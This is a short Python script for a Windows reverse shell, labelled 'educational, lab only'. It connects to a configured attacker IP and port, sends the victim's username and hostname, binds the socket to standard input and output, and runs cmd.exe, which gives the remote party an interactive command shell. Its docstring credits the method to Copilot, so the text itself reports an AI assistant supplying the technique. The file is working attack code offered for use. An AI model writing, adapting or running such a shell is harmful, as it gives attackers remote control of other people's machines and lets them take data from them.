#!/usr/bin/env python3
"""
Simple Interactive Windows Shell (One-liner method)
Educational purposes only - Use in controlled lab environment
Based on the method suggested by Copilot
"""

import socket
import os
import subprocess
import sys

# Import configuration from root directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import config

def create_direct_shell():
    """Create direct shell using socket dup method"""
    try:
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((config.ATTACKER_IP, config.ATTACKER_PORT))
        
        # Send connection banner
        hostname = os.getenv('COMPUTERNAME', 'Unknown')
        username = os.getenv('USERNAME', 'Unknown')
        banner = f"[+] Direct CMD Shell - {username}@{hostname}\n"
        s.send(banner.encode())
        
        # Duplicate socket file descriptor to stdin, stdout, stderr
        # This is the key: we bind cmd.exe directly to the socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        # Execute cmd.exe - this creates a persistent interactive shell
        subprocess.call(['cmd.exe'])
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    create_direct_shell()